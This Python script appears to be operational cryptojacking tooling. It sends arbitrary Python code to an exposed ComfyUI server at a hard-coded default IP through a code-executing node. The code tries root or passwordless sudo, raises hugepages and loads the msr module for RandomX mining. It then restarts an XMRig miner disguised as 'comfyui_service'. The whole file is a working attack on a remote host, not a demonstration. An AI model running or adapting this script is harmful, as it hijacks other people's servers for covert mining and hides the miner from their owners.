"""Allocate huge pages and load MSR on remote machine."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "52.3.27.85"
port = sys.argv[2] if len(sys.argv) > 2 else "80"
base = f"http://{ip}:{port}"

CODE = r'''
import os, subprocess, json, time

lines = []
lines.append(f"whoami: {os.popen('whoami').read().strip()}")
lines.append(f"uid: {os.getuid()}")

is_root = os.getuid() == 0

# 1. Allocate huge pages
if is_root:
    # Need ~1280 pages (2MB each) = 2.5GB for RandomX dataset + JIT + buffer
    target_pages = 1280
    try:
        with open("/proc/sys/vm/nr_hugepages", "w") as f:
            f.write(str(target_pages))
        time.sleep(2)
        with open("/proc/sys/vm/nr_hugepages") as f:
            actual = f.read().strip()
        lines.append(f"hugepages_set: requested={target_pages} actual={actual}")
    except Exception as e:
        lines.append(f"hugepages_set_error: {e}")
        # Try sysctl fallback
        try:
            r = subprocess.run(
                ["sysctl", "-w", f"vm.nr_hugepages={target_pages}"],
                capture_output=True, text=True, timeout=10
            )
            lines.append(f"sysctl_result: {r.stdout.strip()} err={r.stderr.strip()}")
        except Exception as e2:
            lines.append(f"sysctl_error: {e2}")
else:
    # Try sudo
    try:
        r = subprocess.run(
            ["sudo", "-n", "sysctl", "-w", "vm.nr_hugepages=1280"],
            capture_output=True, text=True, timeout=10
        )
        lines.append(f"sudo_sysctl: rc={r.returncode} out={r.stdout.strip()} err={r.stderr.strip()}")
    except Exception as e:
        lines.append(f"sudo_sysctl_error: {e}")

# 2. Load MSR module
try:
    if is_root:
        r = subprocess.run(["modprobe", "msr"], capture_output=True, text=True, timeout=10)
        lines.append(f"modprobe_msr: rc={r.returncode} err={r.stderr.strip()}")
    else:
        r = subprocess.run(["sudo", "-n", "modprobe", "msr"], capture_output=True, text=True, timeout=10)
        lines.append(f"sudo_modprobe_msr: rc={r.returncode} err={r.stderr.strip()}")
except Exception as e:
    lines.append(f"modprobe_error: {e}")

# 3. Verify after changes
try:
    with open("/proc/sys/vm/nr_hugepages") as f:
        lines.append(f"nr_hugepages_now: {f.read().strip()}")
except:
    pass

try:
    with open("/proc/meminfo") as f:
        for line in f:
            if "HugePages_Total" in line or "HugePages_Free" in line:
                lines.append(f"meminfo: {line.strip()}")
except:
    pass

# 4. Check if msr is now loaded
try:
    r = subprocess.run(["lsmod"], capture_output=True, text=True, timeout=5)
    msr_lines = [l for l in r.stdout.splitlines() if l.startswith("msr ")]
    lines.append(f"msr_loaded: {bool(msr_lines)}")
except:
    pass

# 5. Try to also set vm.hugetlb_shm_group for non-root processes
if is_root:
    try:
        subprocess.run(
            ["sysctl", "-w", "vm.hugetlb_shm_group=0"],
            capture_output=True, timeout=5
        )
        lines.append("hugetlb_shm_group set to 0")
    except:
        pass

# 6. Now restart XMRig so it picks up the huge pages
import glob, signal
# Find and kill the XMRig process
try:
    r = subprocess.run(
        ["pgrep", "-f", "comfyui_service"],
        capture_output=True, text=True, timeout=5
    )
    pids = r.stdout.strip().splitlines()
    for pid in pids:
        pid = pid.strip()
        if pid:
            os.kill(int(pid), signal.SIGTERM)
            lines.append(f"killed_xmrig_pid: {pid}")
    if pids:
        time.sleep(3)
        lines.append("XMRig killed - watchdog will restart it with hugepages")
    else:
        lines.append("no xmrig process found to restart")
except Exception as e:
    lines.append(f"kill_error: {e}")

result = chr(10).join(lines)
'''

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": CODE, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

for attempt in range(15):
    time.sleep(5)
    try:
        req2 = urllib.request.Request(f"{base}/history/{pid}")
        with urllib.request.urlopen(req2, timeout=15) as r:
            entry = json.loads(r.read().decode()).get(pid, {})
            status = entry.get("status", {}).get("status_str", "pending")
            if status != "pending":
                print(f"Status: {status}\n")
                outputs = entry.get("outputs", {})
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            for v in val:
                                print(v)
                break
    except Exception as e:
        print(f"poll error: {e}")
else:
    print("Still pending after 75s")
